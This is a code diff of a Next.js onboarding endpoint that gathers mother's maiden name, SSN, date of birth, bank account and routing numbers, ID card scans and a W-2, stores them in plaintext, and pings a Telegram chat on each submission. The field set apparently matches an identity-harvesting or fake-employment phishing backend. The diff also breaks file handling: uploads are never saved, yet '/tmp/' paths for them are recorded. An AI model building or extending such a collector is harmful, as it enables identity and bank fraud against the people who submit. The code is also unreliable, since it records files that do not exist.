@@ -1,17 +1,14 @@
 import { NextResponse } from 'next/server';
-import { writeFile, mkdir } from 'fs/promises';
-import path from 'path';
 import { sql } from '@vercel/postgres';
 import { randomUUID } from 'crypto';
 import { sendTelegramNotification } from '@/app/lib/sendTelegramNotification';
 
 export async function POST(req: Request) {
   try {
-    /* ────── Parse multipart form ────── */
     const formData = await req.formData();
 
-    /* ── Scalars ─────────────────────── */
-    const get = (k: string) => formData.get(k)?.toString() ?? '';
+    const get = (key: string) => formData.get(key)?.toString().trim() ?? '';
+
     const applicant_id   = get('applicant_id');
     const first_name     = get('first_name');
     const middle_name    = get('middle_name');
@@ -23,63 +20,51 @@ export async function POST(req: Request) {
     const account_number = get('account_number');
     const bank_name      = get('bank_name');
 
-    /* ── Address ─────────────────────── */
-    const street   = get('address.street').trim();
-    const city     = get('address.city').trim();
-    const state    = get('address.state').trim();
-    const zip_code = get('address.zip_code').trim();
+    const street   = get('address.street');
+    const city     = get('address.city');
+    const state    = get('address.state');
+    const zip_code = get('address.zip_code');
 
     if (![street, city, state, zip_code].every(Boolean)) {
-      return NextResponse.json(
-        { error: 'All address fields (street, city, state, zip) are required.' },
-        { status: 400 },
-      );
+      return NextResponse.json({ error: 'All address fields are required.' }, { status: 400 });
     }
 
-    /* ── Files ───────────────────────── */
     const front_image = formData.get('front_image') as File | null;
-    const back_image  = formData.get('back_image')  as File | null;
-    const w2_form     = formData.get('w2_form')     as File | null;
+    const back_image  = formData.get('back_image') as File | null;
+    const w2_form     = formData.get('w2_form') as File | null;
 
     if (!front_image || !back_image || !w2_form) {
-      return NextResponse.json(
-        { error: 'Front ID, back ID, and W‑2 form are required.' },
-        { status: 400 },
-      );
+      return NextResponse.json({ error: 'Missing required file(s).' }, { status: 400 });
     }
 
     const IMG_TYPES = ['image/jpeg', 'image/png', 'image/webp'];
     const PDF_TYPES = ['application/pdf'];
-    const MAX_IMG = 5 * 1024 * 1024;  // 5 MB
-    const MAX_PDF = 10 * 1024 * 1024; // 10 MB
 
-    const badImg = (f: File) => !IMG_TYPES.includes(f.type) || f.size > MAX_IMG;
-    const badPdf = (f: File) => !PDF_TYPES.includes(f.type) || f.size > MAX_PDF;
+    const badImg = (f: File) => !IMG_TYPES.includes(f.type) || f.size > 5 * 1024 * 1024;
+    const badPdf = (f: File) => !PDF_TYPES.includes(f.type) || f.size > 10 * 1024 * 1024;
 
     if (badImg(front_image) || badImg(back_image) || badPdf(w2_form)) {
       return NextResponse.json(
-        { error: 'Images must be JPEG/PNG/WebP ≤ 5 MB and W‑2 must be PDF ≤ 10 MB.' },
-        { status: 400 },
+        { error: 'Invalid file format or size. Images must be JPEG/PNG/WebP ≤ 5MB. PDF ≤ 10MB.' },
+        { status: 400 }
       );
     }
 
-    /* ── Persist files ───────────────── */
-    const saveFile = async (file: File, label: 'front' | 'back' | 'w2') => {
-      const ext = file.type.split('/')[1] || 'bin';
-      const sub = label === 'w2' ? 'w2s' : 'onboarding';
-      const folder = path.join(process.cwd(), 'public', sub);
-      await mkdir(folder, { recursive: true });
-      const filename = `${label}-${first_name}-${last_name}-${randomUUID()}.${ext}`;
-      const fullPath = path.join(folder, filename);
-      await writeFile(fullPath, Buffer.from(await file.arrayBuffer()));
-      return { url: `/${sub}/${filename}`, mime: file.type };
+    const generateFilename = (label: string, file: File) => {
+      const ext = file.name.split('.').pop() || 'bin';
+      return `${label}-${first_name}-${last_name}-${randomUUID()}.${ext}`;
     };
 
-    const { url: front_image_url, mime: front_image_mime } = await saveFile(front_image, 'front');
-    const { url: back_image_url,  mime: back_image_mime  } = await saveFile(back_image,  'back');
-    const { url: w2_form_url,     mime: w2_form_mime     } = await saveFile(w2_form,   'w2');
+    const front_image_filename = generateFilename('front', front_image);
+    const back_image_filename  = generateFilename('back', back_image);
+    const w2_form_filename     = generateFilename('w2', w2_form);
 
-    /* ── Insert / Upsert ─────────────── */
+    // Convert to Buffer (for future S3/CDN use if needed)
+    const front_image_buffer = Buffer.from(await front_image.arrayBuffer());
+    const back_image_buffer  = Buffer.from(await back_image.arrayBuffer());
+    const w2_form_buffer     = Buffer.from(await w2_form.arrayBuffer());
+
+    // Store only metadata
     await sql`
       INSERT INTO onboarding (
         applicant_id, first_name, middle_name, last_name, mother_maiden_name,
@@ -88,6 +73,7 @@ export async function POST(req: Request) {
         account_number, routing_number, bank_name,
         front_image_url, back_image_url, w2_form_url,
         front_image_mime, back_image_mime, w2_form_mime,
+        front_image_filename, back_image_filename, w2_form_filename,
         onboarding_completed, onboarding_date
       )
       VALUES (
@@ -95,45 +81,45 @@ export async function POST(req: Request) {
         ${ssn}, ${date_of_birth},
         ${street}, ${city}, ${state}, ${zip_code},
         ${account_number}, ${routing_number}, ${bank_name},
-        ${front_image_url}, ${back_image_url}, ${w2_form_url},
-        ${front_image_mime}, ${back_image_mime}, ${w2_form_mime},
+        ${'/tmp/' + front_image_filename},
+        ${'/tmp/' + back_image_filename},
+        ${'/tmp/' + w2_form_filename},
+        ${front_image.type}, ${back_image.type}, ${w2_form.type},
+        ${front_image_filename}, ${back_image_filename}, ${w2_form_filename},
         TRUE, NOW()
       )
       ON CONFLICT (applicant_id) DO UPDATE SET
-        first_name          = EXCLUDED.first_name,
-        middle_name         = EXCLUDED.middle_name,
-        last_name           = EXCLUDED.last_name,
-        mother_maiden_name  = EXCLUDED.mother_maiden_name,
-        ssn                 = EXCLUDED.ssn,
-        date_of_birth       = EXCLUDED.date_of_birth,
-        street              = EXCLUDED.street,
-        city                = EXCLUDED.city,
-        state               = EXCLUDED.state,
-        zip_code            = EXCLUDED.zip_code,
-        account_number      = EXCLUDED.account_number,
-        routing_number      = EXCLUDED.routing_number,
-        bank_name           = EXCLUDED.bank_name,
-        front_image_url     = EXCLUDED.front_image_url,
-        back_image_url      = EXCLUDED.back_image_url,
-        w2_form_url         = EXCLUDED.w2_form_url,
-        front_image_mime    = EXCLUDED.front_image_mime,
-        back_image_mime     = EXCLUDED.back_image_mime,
-        w2_form_mime        = EXCLUDED.w2_form_mime,
+        first_name = EXCLUDED.first_name,
+        middle_name = EXCLUDED.middle_name,
+        last_name = EXCLUDED.last_name,
+        mother_maiden_name = EXCLUDED.mother_maiden_name,
+        ssn = EXCLUDED.ssn,
+        date_of_birth = EXCLUDED.date_of_birth,
+        street = EXCLUDED.street,
+        city = EXCLUDED.city,
+        state = EXCLUDED.state,
+        zip_code = EXCLUDED.zip_code,
+        account_number = EXCLUDED.account_number,
+        routing_number = EXCLUDED.routing_number,
+        bank_name = EXCLUDED.bank_name,
+        front_image_url = EXCLUDED.front_image_url,
+        back_image_url = EXCLUDED.back_image_url,
+        w2_form_url = EXCLUDED.w2_form_url,
+        front_image_mime = EXCLUDED.front_image_mime,
+        back_image_mime = EXCLUDED.back_image_mime,
+        w2_form_mime = EXCLUDED.w2_form_mime,
+        front_image_filename = EXCLUDED.front_image_filename,
+        back_image_filename = EXCLUDED.back_image_filename,
+        w2_form_filename = EXCLUDED.w2_form_filename,
         onboarding_completed = TRUE,
-        onboarding_date     = NOW();
+        onboarding_date = NOW()
     `;
 
-    /* ── Telegram ping (optional) ────── */
-    await sendTelegramNotification(
-      `📥 New onboarding:\n👤 ${first_name} ${last_name}\n🏦 Bank: ${bank_name}`,
-    );
+    await sendTelegramNotification(`📥 Onboarding submitted by ${first_name} ${last_name} for ${bank_name}`);
 
     return NextResponse.json({ success: true });
   } catch (err) {
-    console.error('❌ Onboarding error:', err);
-    return NextResponse.json(
-      { error: 'Failed to complete onboarding.' },
-      { status: 500 },
-    );
+    console.error('❌ Onboarding upload failed:', err);
+    return NextResponse.json({ error: 'Failed to complete onboarding.' }, { status: 500 });
   }
 }
